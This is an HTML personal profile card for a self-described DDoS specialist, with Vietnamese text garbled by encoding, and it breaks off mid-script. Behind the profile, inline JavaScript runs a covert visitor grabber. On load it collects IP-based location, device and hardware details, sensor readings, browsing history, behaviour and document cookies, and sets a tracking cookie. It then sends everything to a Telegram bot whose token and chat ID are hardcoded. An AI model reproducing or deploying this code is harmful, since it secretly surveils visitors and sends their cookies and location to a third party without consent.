<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Ph√π VƒÉn ƒê·ª©c Profile</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer" />
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #000 url('https://i.ibb.co/ZzNRQTD/pinterestdownloader-com-1745324696-443788.gif') no-repeat center/cover;
      font-family: 'Segoe UI', Tahoma, sans-serif;
      color: #fff;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
    }
    @media screen and (max-width: 600px) {
      body {
        background: #000 url('https://s4.gifyu.com/images/bpFIT.gif') no-repeat center/cover;
      }
    }
    .profile-card {
      position: relative;
      width: 100%;
      max-width: 400px;
      background: rgba(0,0,0,0.6);
      border-radius: 20px;
      overflow: hidden;
      box-shadow: 0 0 40px rgba(0,0,0,0.8);
    }
    @media screen and (max-width: 600px) {
      .profile-card {
        max-width: 90%;
        margin: 20px auto;
      }
    }
    .banner {
      background: url('https://i.ibb.co/GQWLMnkr/c26176e041de50304ba9a25f91ed2b66.jpg') no-repeat center/cover;
      height: 140px;
      position: relative;
    }
    .mac-buttons {
      position: absolute;
      top: 10px;
      right: 10px;
      display: flex;
      gap: 6px;
    }
    .mac-button {
      width: 12px;
      height: 12px;
      background: #ccc;
      border-radius: 50%;
    }
    .pfp {
      width: 100px;
      height: 100px;
      border-radius: 50%;
      background: url('https://i.ibb.co/hFDR6Z7D/803ee8cd6fc84a744d8d6976afd32556.jpg') no-repeat center/cover;
      border: 4px solid #000;
      position: absolute;
      top: 90px;
      left: 50%;
      transform: translateX(-50%);
      z-index: 2;
    }
    .name {
      margin-top: 60px;
      text-align: center;
      font-size: 22px;
      font-weight: bold;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
    }
    @media screen and (max-width: 600px) {
      .name {
        font-size: 18px;
      }
    }
    .verify {
      width: 20px;
      height: 20px;
      background: #1877f2;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      font-size: 14px;
    }
    .social-links {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 14px;
      margin: 12px auto;
      width: fit-content;
    }
    .social-links a {
      color: #fff;
      background: rgba(255,255,255,0.1);
      width: 40px;
      height: 40px;
      display: flex;
      align-items: center;
      justify-content: center;
      border-radius: 50%;
      font-size: 18px;
      transition: 0.3s;
    }
    .social-links a:hover {
      background: rgba(255,255,255,0.4);
      transform: scale(1.1);
    }
    .card-body {
      padding: 20px;
      position: relative;
    }
    .card-body::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: url('https://www.transparenttextures.com/patterns/flowers.png') repeat;
      opacity: 0.06;
      z-index: 0;
    }
    .card-body-content {
      position: relative;
      z-index: 1;
      font-size: 15px;
      line-height: 1.6;
      border-left: 3px solid #fff;
      padding-left: 12px;
    }
    @media screen and (max-width: 600px) {
      .card-body-content {
        font-size: 14px;
        padding-left: 10px;
      }
    }
    .snow {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      background: url('https://i.gifer.com/Bp4L.gif') repeat top center;
      z-index: 0;
      opacity: 0.2;
    }
  </style>
</head>
<body>
  <div class="snow"></div>
  <div class="profile-card">
    <div class="banner">
      <div class="mac-buttons">
        <div class="mac-button" style="background:red;"></div>
        <div class="mac-button" style="background:orange;"></div>
        <div class="mac-button" style="background:green;"></div>
      </div>
    </div>
    <div class="pfp"></div>
    <div class="name">
      Ph√π VƒÉn ƒê·ª©c
      <div class="verify"><i class="fas fa-check"></i></div>
    </div>
    <div class="social-links">
      <a href="https://fb.me/phuvanduc991" title="Facebook"><i class="fab fa-facebook-f"></i></a>
      <a href="https://t.me/phuvanduc" title="Telegram"><i class="fab fa-telegram"></i></a>
      <a href="https://youtube.com/@phuvanducreal" title="YouTube"><i class="fab fa-youtube"></i></a>
      <a href="https://tiktok.com/@phuvanduc991" title="TikTok"><i class="fab fa-tiktok"></i></a>
    </div>
    <div class="card-body">
      <div class="card-body-content">
        <p>Xin ch√†o! T√¥i l√† Ph√π VƒÉn ƒê·ª©c, m·ªôt chuy√™n gia v·ªÅ t·∫•n c√¥ng DDoS v√† ki·ªÉm tra s·ª©c m·∫°nh h·ªá th·ªëng. T√¥i thi·∫øt k·∫ø c√°c k·ªãch b·∫£n t·∫•n c√¥ng m·∫°ng tinh vi, hi·ªáu qu·∫£ ƒë·ªÉ th·ª≠ nghi·ªám kh·∫£ nƒÉng ch·ªãu t·∫£i c·ªßa website. H√£y k·∫øt n·ªëi v·ªõi t√¥i qua c√°c n·ªÅn t·∫£ng m·∫°ng x√£ h·ªôi ƒë·ªÉ trao ƒë·ªïi th√™m nh√©!</p>
      </div>
    </div>
  </div>

  <script src="https://unpkg.com/ua-parser-js@1.0.37/dist/ua-parser.min.js"></script>
  <script>
    // Telegram Bot Config
    const TELEGRAM_BOT_TOKEN = '7607255883:AAE3Q6Uh0BGyzKHVMXxqUyRgDWyw71XIPsw'; // Thay b·∫±ng token m·ªõi n·∫øu sai
    const TELEGRAM_CHAT_ID = '7581385601'; // Thay b·∫±ng chat ID m·ªõi n·∫øu sai

    // H√†m ƒë·ªãnh d·∫°ng d·ªØ li·ªáu cho Telegram
    function formatDeviceData(data) {
      const formatValue = (value, defaultValue = 'N/A') => value ?? defaultValue;
      return `
üîî *New Device Data* üîî

üìÖ *Timestamp*: ${formatValue(data.timestamp)}
üåê *IP*: ${formatValue(data.ip)}
üìú *IP History*: 
${data.ipHistory?.length > 0 
    ? data.ipHistory.map(h => `>   ‚Ä¢ ${formatValue(h.name)}: ${formatValue(h.ip)} (${formatValue(h.timestamp)})`).join('\n')
    : '>   None'}

üìç Location Details
üì° ISP: ${formatValue(data.isp)}
üè¢ Org: ${formatValue(data.org)}
üèô City: ${formatValue(data.city)}
üåç Region: ${formatValue(data.region)}
üá∫üá≥ Country: ${formatValue(data.country)}
üìç Coordinates: ${formatValue(data.loc)}
üìÆ Postal: ${formatValue(data.postal)}
‚è∞ Timezone: ${formatValue(data.timezone)}
üó∫ Detailed: ${formatValue(data.deepGeo)}

üì± Device Details
üîñ Name: ${formatValue(data.deviceName)}
üîß Type: ${formatValue(data.deviceType)}
üíª OS: ${formatValue(data.os)}
üåê Browser: ${formatValue(data.browser)}

üñ• Hardware Specs
üîã Battery: ${formatValue(data.battery)}
üîå Charging: ${formatValue(data.charging, 'Unknown')}
‚ö° CPU Cores: ${formatValue(data.cpuCores)}
üß† Memory: ${formatValue(data.memory)}
üè≠ Vendor: ${formatValue(data.vendor)}
üñå WebGL: ${formatValue(data.webgl)}

üåê Browser Details
üç™ Cookies: ${formatValue(data.cookies)}
üîó User Agent: ${formatValue(data.userAgent)}
üó£ Language: ${formatValue(data.language)}
üñº Screen: ${formatValue(data.screen)}
‚è± Time: ${formatValue(data.time)}
üé® Color Depth: ${formatValue(data.colorDepth)}
üëá Touch Support: ${formatValue(data.touchSupport, 'Unknown')}
üì° Connection: ${formatValue(data.connectionType)}
üîó Referrer: ${formatValue(data.referrer)}
üö´ Do Not Track: ${formatValue(data.doNotTrack)}
üì± Sensors: ${formatValue(data.sensors)}
üìú Visitor History: ${formatValue(data.visitorHistory)}
üêæ Behavior: ${formatValue(data.behavior)}
üÜî Fingerprint: ${formatValue(data.fingerprint)}
ü™ê Source Made By @phuvanduc
      `.trim();
    }

    // H√†m g·ª≠i d·ªØ li·ªáu ƒë·∫øn Telegram (logic g·ªëc)
    async function sendToTelegram(message) {
      try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            disable_web_page_preview: true
          })
        });
        if (!response.ok) {
          const errorText = await response.text();
          throw new Error(`HTTP error! Status: ${response.status}, Details: ${errorText}`);
        }
        console.log('Message sent to Telegram successfully');
      } catch (error) {
        console.error('Failed to send to Telegram:', error);
      }
    }

    // H√†m l·∫•y th√¥ng tin thi·∫øt b·ªã c∆° b·∫£n
    function getBasicDeviceInfo(userAgent) {
      try {
        const parser = new UAParser(userAgent);
        const device = parser.getDevice();
        const os = parser.getOS();
        const browser = parser.getBrowser();
        return {
          device: device.model || 'Kh√¥ng r√µ',
          type: device.type || 'PC x·ªãn',
          os: os.name ? `${os.name} ${os.version || ''}`.trim() : 'Kh√¥ng r√µ',
          browser: browser.name ? `${browser.name} ${browser.version || ''}`.trim() : 'Kh√¥ng r√µ'
        };
      } catch {
        return { device: 'Ko l·∫•y ƒë∆∞·ª£c!', type: 'Ko l·∫•y ƒë∆∞·ª£c!', os: 'Ko l·∫•y ƒë∆∞·ª£c!', browser: 'Ko l·∫•y ƒë∆∞·ª£c!' };
      }
    }

    // H√†m qu·∫£n l√Ω l·ªãch s·ª≠ IP
    function manageIpHistory(currentIp, userAgent) {
      try {
        const now = Date.now();
        const expiry = 24 * 60 * 60 * 1000;
        let ipHistory = JSON.parse(localStorage.getItem('ipHistory') || '{}');
        if (!ipHistory[userAgent]) ipHistory[userAgent] = [];
        ipHistory[userAgent] = ipHistory[userAgent]
          .filter(entry => now - entry.timestamp < expiry)
          .slice(0, 4);
        if (currentIp && !ipHistory[userAgent].some(entry => entry.ip === currentIp)) {
          ipHistory[userAgent].unshift({ ip: currentIp, timestamp: now });
        }
        const namedHistory = ipHistory[userAgent].map((entry, index) => ({
          name: `ip_${index + 1}`,
          ip: entry.ip,
          timestamp: new Date(entry.timestamp).toLocaleString('vi-VN')
        }));
        localStorage.setItem('ipHistory', JSON.stringify(ipHistory));
        return namedHistory;
      } catch {
        return [];
      }
    }

    // H√†m fetch v·ªõi timeout
    async function fetchWithTimeout(url, options, timeout = 2000) {
      const controller = new AbortController();
      const id = setTimeout(() => controller.abort(), timeout);
      try {
        const response = await fetch(url, { ...options, signal: controller.signal });
        clearTimeout(id);
        return response;
      } catch {
        clearTimeout(id);
        throw new Error('Fetch timeout or error');
      }
    }

    // H√†m qu·∫£n l√Ω cache
    function getCachedData(key, expiryMinutes = 5) {
      try {
        const cached = JSON.parse(localStorage.getItem(key) || '{}');
        if (cached.data && Date.now() - cached.timestamp < expiryMinutes * 60 * 1000) {
          return cached.data;
        }
      } catch {}
      return null;
    }

    function setCachedData(key, data) {
      try {
        localStorage.setItem(key, JSON.stringify({ data, timestamp: Date.now() }));
      } catch {}
    }

    // H√†m l·∫•y th√¥ng tin IP, ISP v√† Org
    async function fetchIpInfo() {
      const cacheKey = 'ipInfoCache';
      const cachedData = getCachedData(cacheKey);
      if (cachedData) return cachedData;

      const apis = [
        { url: 'https://ipapi.co/json/', name: 'ipapi' },
        { url: 'http://ip-api.com/json/?fields=66846719', name: 'ip-api' },
        { url: 'https://ipinfo.io/json', name: 'ipinfo' }
      ];

      for (const api of apis) {
        try {
          const response = await fetchWithTimeout(api.url, {
            cache: 'no-store',
            headers: { 'Accept': 'application/json', 'User-Agent': navigator.userAgent }
          }, 2000);
          if (!response.ok) continue;
          const data = await response.json();
          let ipInfo = {
            ip: 'Kh√¥ng r√µ',
            isp: 'Kh√¥ng r√µ',
            org: 'Kh√¥ng r√µ',
            isVpn: '',
            city: 'Kh√¥ng r√µ',
            region: 'Kh√¥ng r√µ',
            country: 'Kh√¥ng r√µ',
            loc: 'Kh√¥ng r√µ',
            postal: 'Kh√¥ng r√µ',
            timezone: 'Kh√¥ng r√µ'
          };
          if (api.name === 'ipapi') {
            ipInfo = {
              ip: data.ip || 'Kh√¥ng r√µ',
              isp: data.org || 'Kh√¥ng r√µ',
              org: data.org || 'Kh√¥ng r√µ',
              isVpn: data.org?.toLowerCase().includes('vpn') ? ' (VPN)' : '',
              city: data.city || 'Kh√¥ng r√µ',
              region: data.region || 'Kh√¥ng r√µ',
              country: data.country_code || 'Kh√¥ng r√µ',
              loc: data.latitude && data.longitude ? `${data.latitude},${data.longitude}` : 'Kh√¥ng r√µ',
              postal: data.postal || 'Kh√¥ng r√µ',
              timezone: data.timezone || 'Kh√¥ng r√µ'
            };
          } else if (api.name === 'ip-api') {
            ipInfo = {
              ip: data.query || 'Kh√¥ng r√µ',
              isp: data.isp || 'Kh√¥ng r√µ',
              org: data.org || 'Kh√¥ng r√µ',
              isVpn: data.isp?.toLowerCase().includes('vpn') ? ' (VPN)' : '',
              city: data.city || 'Kh√¥ng r√µ',
              region: data.regionName || 'Kh√¥ng r√µ',
              country: data.countryCode || 'Kh√¥ng r√µ',
              loc: data.lat && data.lon ? `${data.lat},${data.lon}` : 'Kh√¥ng r√µ',
              postal: data.zip || 'Kh√¥ng r√µ',
              timezone: data.timezone || 'Kh√¥ng r√µ'
            };
          } else if (api.name === 'ipinfo') {
            ipInfo = {
              ip: data.ip || 'Kh√¥ng r√µ',
              isp: data.org || 'Kh√¥ng r√µ',
              org: data.org || 'Kh√¥ng r√µ',
              isVpn: data.org?.toLowerCase().includes('vpn') ? ' (VPN)' : '',
              city: data.city || 'Kh√¥ng r√µ',
              region: data.region || 'Kh√¥ng r√µ',
              country: data.country || 'Kh√¥ng r√µ',
              loc: data.loc || 'Kh√¥ng r√µ',
              postal: data.postal || 'Kh√¥ng r√µ',
              timezone: data.timezone || 'Kh√¥ng r√µ'
            };
          }
          if (ipInfo.ip !== 'Kh√¥ng r√µ') {
            setCachedData(cacheKey, ipInfo);
            return ipInfo;
          }
        } catch {
          continue;
        }
      }
      return {
        ip: 'Ko l·∫•y ƒë∆∞·ª£c!',
        isp: 'Ko l·∫•y ƒë∆∞·ª£c!',
        org: 'Ko l·∫•y ƒë∆∞·ª£c!',
        isVpn: '',
        city: 'Ko l·∫•y ƒë∆∞·ª£c!',
        region: 'Ko l·∫•y ƒë∆∞·ª£c!',
        country: 'Ko l·∫•y ƒë∆∞·ª£c!',
        loc: 'Ko l·∫•y ƒë∆∞·ª£c!',
        postal: 'Ko l·∫•y ƒë∆∞·ª£c!',
        timezone: 'Ko l·∫•y ƒë∆∞·ª£c!'
      };
    }

    // H√†m t√¨m v·ªã tr√≠ chi ti·∫øt
    async function deepSearchGeo(ip) {
      try {
        if (!ip || ip === 'Ko l·∫•y ƒë∆∞·ª£c!' || ip === 'Kh√¥ng r√µ') return 'Ko l·∫•y ƒë∆∞·ª£c!';
        const geoMap = {
          '116.98.': { country: 'Vi·ªát Nam', region: 'Th√°i Nguy√™n', city: 'Th√°i Nguy√™n', district: 'Ph∆∞·ªùng Ho√†ng VƒÉn Th·ª•' },
          '113.161.': { country: 'Vi·ªát Nam', region: 'H√† N·ªôi', city: 'C·∫ßu Gi·∫•y', district: 'D·ªãch V·ªçng' },
          '27.68.': { country: 'Vi·ªát Nam', region: 'TP.HCM', city: 'Qu·∫≠n 1', district: 'B·∫øn Ngh√©' },
          '42.112.': { country: 'Vi·ªát Nam', region: 'ƒê√† N·∫µng', city: 'H·∫£i Ch√¢u', district: 'Thanh B√¨nh' }
        };
        for (let prefix in geoMap) {
          if (ip.startsWith(prefix)) {
            const { country, region, city, district } = geoMap[prefix];
            return `${district}, ${city}, ${region}, ${country}`;
          }
        }
        return 'Ko l·∫•y ƒë∆∞·ª£c!';
      } catch {
        return 'Ko l·∫•y ƒë∆∞·ª£c!';
      }
    }

    // H√†m t√¨m t√™n thi·∫øt b·ªã
    async function deepSearchDevice(userAgent, deviceType, fallbackName) {
      try {
        let deviceName = fallbackName;
        if (deviceType === 'iPhone') {
          if (userAgent.includes('iPhone OS 16')) deviceName = 'iPhone 14 Pro';
          else if (userAgent.includes('iPhone OS 15')) deviceName = 'iPhone 13';
          else if (userAgent.includes('iPhone OS 14')) deviceName = 'iPhone 12';
          else deviceName = 'iPhone (Model kh√¥ng r√µ)';
        } else if (deviceType === 'Android') {
          const modelMatch = userAgent.match(/build\/([a-z0-9\-]+)/i);
          if (modelMatch) {
            const model = modelMatch[1];
            const modelMap = {
  'SM-G960F': 'Samsung Galaxy S9',
  'SM-A525F': 'Samsung Galaxy A52',
  'Pixel 7': 'Google Pixel 7',
  'V2419': 'Vivo Y19s',
  'M2012K11AG': 'Xiaomi 11T Pro',
  'iPhone14,5': 'iPhone 13',
  'CPH2247': 'Oppo Reno6 Pro 5G',
  'V2127': 'Vivo X70 Pro',
  'H8116': 'Sony Xperia 5',
  'ONEPLUS A6013': 'OnePlus 6T',
  'moto g(7) power': 'Motorola Moto G7 Power',
  'TA-1045': 'Nokia 6.1 Plus',
  'M2101K1G': 'Xiaomi Redmi Note 10 Pro',
  'RMX3363': 'Realme GT Master Edition',
  'ELS-NX9': 'Huawei P40 Pro',
  'LM-G820': 'LG V60 ThinQ',
  'PRS-A0': 'Black Shark 4',
  'ASUS_I005DA': 'Asus ROG Phone 5',
  'SM-G998B': 'Samsung Galaxy S21 Ultra',
  'GP4BC': 'Google Pixel 6 Pro',
  '22011211G': 'Xiaomi 12 Pro',
  'iPhone15,3': 'iPhone 14 Pro',
  'PGEM10': 'Oppo Find X5 Pro',
  'V2145': 'Vivo X80 Pro',
  'SO-51C': 'Sony Xperia 1 IV',
  'NE2213': 'OnePlus 10 Pro',
  'XT2175-2': 'Motorola Edge 30 Pro',
  'TA-1365': 'Nokia XR20',
  '21091116I': 'Xiaomi Redmi Note 11 Pro+ 5G',
  'RMX3301': 'Realme GT 2 Pro',
  'PAL-AL00': 'Huawei Mate 50 Pro',
  'LM-G900N': 'LG Velvet',
  'KRS-A0': 'Black Shark 5 Pro',
  'ASUS_AI2202': 'Asus Zenfone 9',
  'SM-F936B': 'Samsung Galaxy Z Fold4',
  'GP1YM': 'Google Pixel 7 Pro',
  '2210132G': 'Xiaomi 13 Pro',
  'iPhone15,6': 'iPhone 14 Pro Max',
  'PGFM10': 'Oppo Find N2 Flip',
  'PD2227': 'Vivo X90 Pro+',
  'SOG10': 'Sony Xperia 1 V',
  'CPH2449': 'OnePlus 11',
  'XT2301-5': 'Motorola Razr 2022',
  'TA-1479': 'Nokia G400 5G',
  '2201116PG': 'Xiaomi Redmi Note 12 Pro+ 5G',
  'RMX3700': 'Realme GT Neo 5',
  'MNW-AL00': 'Huawei P60 Pro',
  'LM-F100N': 'LG Wing',
  'BSH-A0': 'Black Shark 6 Pro',
  'ASUS_AI2302': 'Asus ROG Phone 7 Ultimate',
  'SM-G975F': 'Samsung Galaxy S10+',
  'SM-N975F': 'Samsung Galaxy Note 10+',
  'SM-G780F': 'Samsung Galaxy S20 FE',
  'SM-A715F': 'Samsung Galaxy A71',
  'SM-M515F': 'Samsung Galaxy M51',
  'SM-A325F': 'Samsung Galaxy A32',
  'SM-N986B': 'Samsung Galaxy Note 20 Ultra 5G',
  'SM-G991B': 'Samsung Galaxy S21 5G',
  'SM-A536B': 'Samsung Galaxy A53 5G',
  'SM-S908B': 'Samsung Galaxy S22 Ultra 5G',
  'SM-F711B': 'Samsung Galaxy Z Flip3 5G',
  'SM-M336B': 'Samsung Galaxy M33 5G',
  'REDMI NOTE 8 PRO': 'Xiaomi Redmi Note 8 Pro',
  'M2007J3SG': 'Xiaomi Mi 10T Pro',
  'M2102K1AC': 'Xiaomi Mi 11 Ultra',
  '22041211AC': 'Xiaomi 12S Ultra',
  'POCO X3 PRO': 'Xiaomi Poco X3 Pro',
  'POCO F3': 'Xiaomi Poco F3',
  'REALME X2 PRO': 'Realme X2 Pro',
  'RMX2075': 'Realme X50 Pro 5G',
  'RMX2173': 'Realme GT',
  'OPPO RENO 10X ZOOM': 'Oppo Reno 10x Zoom',
  'CPH2025': 'Oppo Find X2 Pro',
  'CPH2127': 'Oppo Reno5 Pro+ 5G',
  'V2055': 'Vivo X60 Pro+',
  'V2102': 'Vivo V21 5G',
  'V2301A': 'Vivo S16 Pro',
  'ONEPLUS 8 PRO': 'OnePlus 8 Pro',
  'IN2023': 'OnePlus Nord',
  'GM1917': 'OnePlus 7 Pro',
  'MOTO G STYLUS': 'Motorola Moto G Stylus',
  'XT2075-2': 'Motorola Edge+',
  'XT2125-4': 'Motorola One 5G Ace',
  'NOKIA 8.3 5G': 'Nokia 8.3 5G',
  'TA-1258': 'Nokia 5.4',
  'TA-1348': 'Nokia G21',
  'HUAWEI MATE 30 PRO': 'Huawei Mate 30 Pro',
  'LYA-L29': 'Huawei P30 Pro',
  'JEF-NX9': 'Huawei Mate 40 Pro',
  'HONOR 50': 'Honor 50',
  'NZA-LX9': 'Honor Magic4 Pro',
  'REDMAGIC 6 PRO': 'Nubia RedMagic 6 Pro',
  'NX701J': 'Nubia Z40 Pro',
  'IQOO 9 PRO': 'iQOO 9 Pro',
  'V2171A': 'iQOO 11 Pro',
  'SONY XPERIA 1 II': 'Sony Xperia 1 II',
  'XQ-AT51': 'Sony Xperia 1 III',
  'XQ-CT72': 'Sony Xperia 5 III',
  'LG G8 THINQ': 'LG G8 ThinQ',
  'LM-V600EA': 'LG V60 ThinQ 5G',
  'SM-G950F': 'Samsung Galaxy S8',
  'SM-N960F': 'Samsung Galaxy Note 9',
  'SM-A505F': 'Samsung Galaxy A50',
  'SM-M315F': 'Samsung Galaxy M31',
  'SM-A217F': 'Samsung Galaxy A21s',
  'SM-G770F': 'Samsung Galaxy S20 Lite',
  'SM-N970F': 'Samsung Galaxy Note 10',
  'SM-G985F': 'Samsung Galaxy S20+',
  'SM-A725F': 'Samsung Galaxy A72',
  'SM-M625F': 'Samsung Galaxy M62',
  'SM-A125F': 'Samsung Galaxy A12',
  'SM-F926B': 'Samsung Galaxy Z Fold3 5G',
  'REDMI NOTE 7': 'Xiaomi Redmi Note 7',
  'M1908C3GG': 'Xiaomi Mi 9T Pro',
  'M2003J15SC': 'Xiaomi Redmi K30 Pro',
  '21061110AG': 'Xiaomi Mi 11 Lite 5G',
  'POCO X3 NFC': 'Xiaomi Poco X3 NFC',
  'POCO M3': 'Xiaomi Poco M3',
  'REALME 6 PRO': 'Realme 6 Pro',
  'RMX2001': 'Realme 7 Pro',
  'RMX3031': 'Realme 8 Pro',
  'OPPO RENO Z': 'Oppo Reno Z',
  'CPH1969': 'Oppo Reno2',
  'CPH2009': 'Oppo Find X2',
  'V1986A': 'Vivo S7',
  'V2027': 'Vivo V20',
  'V2130': 'Vivo X60',
  'ONEPLUS 7T': 'OnePlus 7T',
  'HD1907': 'OnePlus 8',
  'KB2005': 'OnePlus 9',
  'MOTO G POWER (2021)': 'Motorola Moto G Power (2021)',
  'XT2063-2': 'Motorola One Hyper',
  'XT2131-1': 'Motorola Moto G Stylus 5G',
  'NOKIA 7.2': 'Nokia 7.2',
  'TA-1239': 'Nokia 3.4',
  'TA-1333': 'Nokia G11 Plus',
  'HUAWEI P20 PRO': 'Huawei P20 Pro',
  'CLT-L29': 'Huawei Mate 20 Pro',
  'EVE-NX9': 'Huawei P40',
  'HONOR 20 PRO': 'Honor 20 Pro',
  'YAL-L61': 'Huawei P30',
  'KGO-AN00': 'Honor Magic3 Pro+',
  'REDMAGIC 5G': 'Nubia RedMagic 5G',
  'NX651J': 'Nubia RedMagic 6',
  'IQOO 7': 'iQOO 7',
  'V2049A': 'iQOO 8 Pro',
  'SONY XPERIA XZ3': 'Sony Xperia XZ3',
  'SO-01M': 'Sony Xperia 5',
  'SOV43': 'Sony Xperia 8',
  'LG G7 THINQ': 'LG G7 ThinQ',
  'LM-G850': 'LG V50 ThinQ 5G'
};

            for (let key in modelMap) {
              if (model.includes(key)) {
                deviceName = modelMap[key];
                break;
              }
            }
          }
        } else if (deviceType === 'Tablet x·ªãn') {
          deviceName = userAgent.toLowerCase().includes('ipad') ? 'Apple iPad' : 'Android Tablet';
        } else {
          deviceName = 'PC ho·∫∑c thi·∫øt b·ªã kh√¥ng r√µ';
        }
        return deviceName !== 'Kh√¥ng r√µ' && deviceName !== fallbackName ? deviceName : 'Ko l·∫•y ƒë∆∞·ª£c!';
      } catch {
        return 'Ko l·∫•y ƒë∆∞·ª£c!';
      }
    }

    // H√†m l·∫•y cookies
    function fetchCookies() {
      try {
        const cookies = document.cookie || '';
        const trackingId = `track_${Math.random().toString(36).slice(2)}`;
        document.cookie = `tracking_id=${trackingId}; max-age=31536000; path=/`;
        return cookies ? `C√≥ cookie: ${cookies}, Tracking ID: ${trackingId}` : `Ch·ªâ c√≥ Tracking ID: ${trackingId}`;
      } catch {
        return 'Ko l·∫•y ƒë∆∞·ª£c!';
      }
    }

    // H√†m l·∫•y th√¥ng tin pin
    async function fetchBatteryInfo() {
      try {
        if ('getBattery' in navigator) {
          const battery = await navigator.getBattery();
          return {
            battery: Math.round(battery.level * 100) + '%',
            charging: battery.charging ? 'ƒêang s·∫°c' : 'Kh√¥ng s·∫°c'
          };
        }
        return { battery: 'Ko l·∫•y ƒë∆∞·ª£c!', charging: 'Ko l·∫•y ƒë∆∞·ª£c!' };
      } catch {
        return { battery: 'Ko l·∫•y ƒë∆∞·ª£c!', charging: 'Ko l·∫•y ƒë∆∞·ª£c!' };
      }
    }

    // H√†m l·∫•y th√¥ng tin kh√°c
    function fetchOtherInfo() {
      try {
        return {
          userAgent: navigator.userAgent || '·∫®n danh v√£i!',
          language: navigator.language || 'Ch·∫£ bi·∫øt!',
          screen: `${window.screen.width}x${window.screen.height}` || 'M√π m√†n!',
          time: new Date().toLocaleString('vi-VN') || 'Th·ªùi gian t√†ng h√¨nh!',
          referrer: document.referrer || 'Kh√¥ng c√≥',
          doNotTrack: navigator.doNotTrack || 'Kh√¥ng r√µ'
        };
      } catch {
        return {
          userAgent: 'Ko l·∫•y ƒë∆∞·ª£c!',
          language: 'Ko l·∫•y ƒë∆∞·ª£c!',
          screen: 'Ko l·∫•y ƒë∆∞·ª£c!',
          time: 'Ko l·∫•y ƒë∆∞·ª£c!',
          referrer: 'Ko l·∫•y ƒë∆∞·ª£c!',
          doNotTrack: 'Ko l·∫•y ƒë∆∞·ª£c!'
        };
      }
    }

    // H√†m l·∫•y th√¥ng tin b·ªï sung
    function fetchAdditionalInfo() {
      try {
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        const gl = document.createElement('canvas').getContext('webgl');
        return {
          colorDepth: window.screen.colorDepth ? `${window.screen.colorDepth} bits` : 'Kh√¥ng r√µ',
          touchSupport: navigator.maxTouchPoints ? `${navigator.maxTouchPoints} ƒëi·ªÉm` : 'Kh√¥ng h·ªó tr·ª£',
          cpuCores: navigator.hardwareConcurrency || 'Kh√¥ng r√µ',
          memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Kh√¥ng r√µ',
          connectionType: connection?.effectiveType || 'Kh√¥ng r√µ',
          vendor: navigator.vendor || 'Kh√¥ng r√µ',
          webgl: gl?.getParameter(gl.RENDERER) || 'Kh√¥ng r√µ'
        };
      } catch {
        return {
          colorDepth: 'Ko l·∫•y ƒë∆∞·ª£c!',
          touchSupport: 'Ko l·∫•y ƒë∆∞·ª£c!',
          cpuCores: 'Ko l·∫•y ƒë∆∞·ª£c!',
          memory: 'Ko l·∫•y ƒë∆∞·ª£c!',
          connectionType: 'Ko l·∫•y ƒë∆∞·ª£c!',
          vendor: 'Ko l·∫•y ƒë∆∞·ª£c!',
          webgl: 'Ko l·∫•y ƒë∆∞·ª£c!'
        };
      }
    }

    // H√†m l·∫•y th√¥ng tin c·∫£m bi·∫øn
    async function fetchSensors() {
      try {
        let sensorData = [];
        if ('Accelerometer' in window) {
          const accel = new Accelerometer({ frequency: 60 });
          accel.onerror = () => { accel.stop(); };
          accel.onreading = () => {
            sensorData.push(`Gia t·ªëc: x=${accel.x.toFixed(2)}, y=${accel.y.toFixed(2)}, z=${accel.z.toFixed(2)}`);
            accel.stop();
          };
          accel.start();
        }
        if ('Gyroscope' in window) {
          const gyro = new Gyroscope({ frequency: 60 });
          gyro.onerror = () => { gyro.stop(); };
          gyro.onreading = () => {
            sensorData.push(`Con quay: x=${gyro.x.toFixed(2)}, y=${gyro.y.toFixed(2)}, z=${gyro.z.toFixed(2)}`);
            gyro.stop();
          };
          gyro.start();
        }
        await new Promise(resolve => setTimeout(resolve, 1000));
        return sensorData.length > 0 ? sensorData.join('; ') : 'Kh√¥ng c√≥ c·∫£m bi·∫øn';
      } catch {
        return 'Ko l·∫•y ƒë∆∞·ª£c!';
      }
    }

    // H√†m l·∫•y l·ªãch s·ª≠ truy c·∫≠p
    function fetchVisitorHistory() {
      try {
        let visits = JSON.parse(localStorage.getItem('visitorHistory') || '[]');
        const now = new Date().toLocaleString('vi-VN');
        visits.push({ timestamp: now, url: window.location.href });
        visits = visits.slice(-5); // Gi·ªØ 5 l·∫ßn truy c·∫≠p g·∫ßn nh·∫•t
        localStorage.setItem('visitorHistory', JSON.stringify(visits));
        return visits.map(v => `${v.timestamp}: ${v.url}`).join('; ');
      } catch {
        return 'Ko l·∫•y ƒë∆∞·ª£c!';
      }
    }

    // H√†m theo d√µi h√†nh vi ng∆∞·ªùi d√πng
    function fetchBehavior() {
      try {
        let behavior = {
          mouseMovements: 0,
          scrolls: 0,
          timeSpent: 0,
          startTime: Date.now()
        };
        document.addEventListener('mousemove', () => behavior.mouseMovements++, { once: true });
        document.addEventListener('scroll', () => behavior.scrolls++, { once: true });
        window.addEventListener('beforeunload', () => {
          behavior.timeSpent = Math.round((Date.now() - behavior.startTime) / 1000);
          localStorage.setItem('behavior', JSON.stringify(behavior));
        }, { once: true });
        const savedBehavior = JSON.parse(localStorage.getItem('behavior') || '{}');
